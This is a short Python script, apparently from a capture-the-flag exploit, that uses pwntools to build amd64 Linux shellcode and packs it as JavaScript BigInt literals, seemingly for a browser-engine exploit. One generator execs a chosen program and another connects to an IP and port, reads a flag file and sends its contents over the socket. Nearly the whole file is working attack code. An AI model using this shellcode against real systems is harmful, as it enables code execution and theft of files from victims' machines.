from pwn import *
from typing import List

# nameserver 127.0.0.53

context(os="linux", arch="amd64")


def generate_execve(exe_path: str, argv: List[str], envp: List[str]) -> bytes:
    sh = asm("nop;\n" * 16 + shellcraft.execve(exe_path, argv, envp))
    return sh


def generate_send_flag(ip: str, port: int, flag_path: str) -> bytes:
    # connect to remote server (scoket will be in rbp)
    sh = asm(shellcraft.amd64.linux.connect(ip, port))
    sh += asm(shellcraft.amd64.linux.readfile(flag_path, "rbp"))
    sh += asm(shellcraft.amd64.linux.exit(0))

    # p = run_shellcode(sh)
    # p.wait_for_close()

    return sh


def pack_to_bigint(sh: bytes) -> str:
    packed_sh = ""
    chunks = [sh[i : i + 8] for i in range(0, len(sh), 8)]
    for ch in chunks:
        packed_sh += (
            "0x" + "".join([hex(i)[2:].rjust(2, "0") for i in ch[::-1]]) + "n,\n"
        )
    return packed_sh


def main():
    # print(pack_to_bigint(generate_execve('/usr/bin/xcalc', ['/usr/bin/xcalc'], ['DISPLAY=:0'])))
    print(pack_to_bigint(generate_send_flag("127.0.0.1", 1337, "/ubercaged/flag.txt")))


if __name__ == "__main__":
    main()
